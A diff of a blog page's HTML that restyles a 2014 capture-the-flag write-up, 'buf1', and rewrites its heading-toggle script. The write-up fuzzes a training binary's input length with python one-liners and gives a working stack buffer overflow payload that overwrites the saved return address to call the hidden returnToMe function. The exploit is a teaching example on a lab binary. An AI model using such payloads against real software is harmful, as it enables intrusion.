@@ -31,16 +31,16 @@
       </table>
     </div>
     <div class="body">
-          <h1>buf1 - Another Buffer Overflow Challenge</h1>
+          <h1 class="h1 collapsible" onclick="toggle(this);">buf1 - Another Buffer Overflow Challenge</h1>
                   <p><a href="/posts/20140106_buf0-challenge.html"> « </a>📅 published on <code>24/Feb/2014</code><a href="/posts/20140318_shellcode-pipeline.html"> » </a></p>
-                <h2>Introduction</h2>
-<p>The binary can be obtained from here: <a href="/static/files/posts_buf1_challenge/buf1.bin">buf1</a>. Let's see what <code>file</code> command has to tell us about this challenge file:</p>
-<pre><code>$ file buf1.bin
+                <h2 class="h2 collapsible" onclick="toggle(this);">Introduction</h2>
+<p class="nested">The binary can be obtained from here: <a href="/static/files/posts_buf1_challenge/buf1.bin">buf1</a>. Let's see what <code>file</code> command has to tell us about this challenge file:</p>
+<pre class="nested"><code>$ file buf1.bin
 buf1.bin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x746bc251bceb3d50b635362140ec851bf6f85317, not stripped
 </code></pre>
-<h2>Program Analysis and Testing</h2>
-<p>So this binary, like it's <a href="https://7h3ram.github.io/posts/20140106_buf0-challenge.html">counterpart</a>, is also an x86 ELF with symbols included. Let's run <code>strings</code> as well over this file:</p>
-<pre><code>$ strings buf1.bin
+<h2 class="h2 collapsible" onclick="toggle(this);">Program Analysis and Testing</h2>
+<p class="nested">So this binary, like it's <a href="https://7h3ram.github.io/posts/20140106_buf0-challenge.html">counterpart</a>, is also an x86 ELF with symbols included. Let's run <code>strings</code> as well over this file:</p>
+<pre class="nested"><code>$ strings buf1.bin
 /lib/ld-linux.so.2
 ktP=
 __gmon_start__
@@ -56,12 +56,12 @@ UWVS
 W00T!
 ;*2$&quot;
 </code></pre>
-<p>There's the <code>gets</code> syscall and the <code>W00T!</code> string which confirm that this indeed is very similar to the previous challenge. Before we execute this file, let's do some static analysis on it using IDA:</p>
-<p><img alt="image" src="/static/files/posts_buf1_challenge/ida-start.png.webp" /></p>
-<p>Apart from the standard libc defintions and <code>main</code>, I see an interesting function called <code>returnToMe</code> at location 0x08048404. Let's follow this function and see what is it doing:</p>
-<p><img alt="image" src="/static/files/posts_buf1_challenge/ida-returntome.png.webp" /></p>
-<p>Let's figure out the size of the buffer to know how many bytes would be needed to reach saved EIP:</p>
-<pre><code>$ python -c 'print &quot;A&quot;*40' | ./buf1.bin
+<p class="nested">There's the <code>gets</code> syscall and the <code>W00T!</code> string which confirm that this indeed is very similar to the previous challenge. Before we execute this file, let's do some static analysis on it using IDA:</p>
+<p class="nested"><img alt="image" src="/static/files/posts_buf1_challenge/ida-start.png.webp" /></p>
+<p class="nested">Apart from the standard libc defintions and <code>main</code>, I see an interesting function called <code>returnToMe</code> at location 0x08048404. Let's follow this function and see what is it doing:</p>
+<p class="nested"><img alt="image" src="/static/files/posts_buf1_challenge/ida-returntome.png.webp" /></p>
+<p class="nested">Let's figure out the size of the buffer to know how many bytes would be needed to reach saved EIP:</p>
+<pre class="nested"><code>$ python -c 'print &quot;A&quot;*40' | ./buf1.bin
 $ python -c 'print &quot;A&quot;*50' | ./buf1.bin
 $ python -c 'print &quot;A&quot;*60' | ./buf1.bin
 $ python -c 'print &quot;A&quot;*70' | ./buf1.bin
@@ -74,31 +74,24 @@ $
 $ python -c 'print &quot;A&quot;*67' | ./buf1.bin
 Segmentation fault (core dumped)
 </code></pre>
-<p>So, the binary accepts max 66B before <code>gets</code> overwrites saved EIP. Now we can inject the buffer with dummy input followed by the address of <code>returnToMe</code> function:</p>
-<pre><code>$ python -c 'print &quot;A&quot;*66 + &quot;\x04\x84\x04\x08&quot;' | ./buf1.bin
+<p class="nested">So, the binary accepts max 66B before <code>gets</code> overwrites saved EIP. Now we can inject the buffer with dummy input followed by the address of <code>returnToMe</code> function:</p>
+<pre class="nested"><code>$ python -c 'print &quot;A&quot;*66 + &quot;\x04\x84\x04\x08&quot;' | ./buf1.bin
 W00T!
 Segmentation fault (core dumped)
 </code></pre>
-<h2>Conclusion</h2>
-<p>Done. But this time the program didn't exit cleanly. However, the challenge was to get the <code>returnToMe</code> function called and it was done successfully. But it's not always about completing challenges. Let's take it as a learning opportunity and understand why, being so similar, both challenges exited in different manner. To understand this and other such minute intricacies of buffer overflows read my previous posts starting with: <a href="https://7h3ram.github.io/posts/20120827_geras-wuos-stack1-solutions.html">Gera's Warming Up on Stack #1 - Solutions</a>.</p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Conclusion</h2>
+<p class="nested">Done. But this time the program didn't exit cleanly. However, the challenge was to get the <code>returnToMe</code> function called and it was done successfully. But it's not always about completing challenges. Let's take it as a learning opportunity and understand why, being so similar, both challenges exited in different manner. To understand this and other such minute intricacies of buffer overflows read my previous posts starting with: <a href="https://7h3ram.github.io/posts/20120827_geras-wuos-stack1-solutions.html">Gera's Warming Up on Stack #1 - Solutions</a>.</p>
         <p style="text-align:center;">(🔖 tagged <a href=/tags.html#ctf>ctf</a>)</p>
                   <p style="text-align:center;">« <a href="/posts/20140106_buf0-challenge.html">buf0 - A Buffer Overflow Chall...</a> « | » <a href="/posts/20140318_shellcode-pipeline.html">Shellcode Analysis Pipleine...</a> »</p>
             </div>
     <div class="footer footercenter">
       <span>
-        <a href=https://creativecommons.org/licenses/by-sa/4.0/ class=footspan>  </a>
+        <a href="https://github.com/7h3rAm/7h3rAm.github.io" class="footspan">  </a>
       </span>
     </div>
     <script>hljs.initHighlightingOnLoad();</script>
     <script>hljs.initLineNumbersOnLoad();</script>
-    <script>
-      function toggle(s){
-        s.classList.toggle("expanded");
-        for(var l=s.nextElementSibling;l;){
-          l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
-        }
-      }
-    </script>
+    <script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0),console.log(s),console.log(t),console.log(i),console.log(a);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script>
     <script data-goatcounter=https://manthan.goatcounter.com/count async src=//gc.zgo.at/count.js></script>
   </body>
 </html>
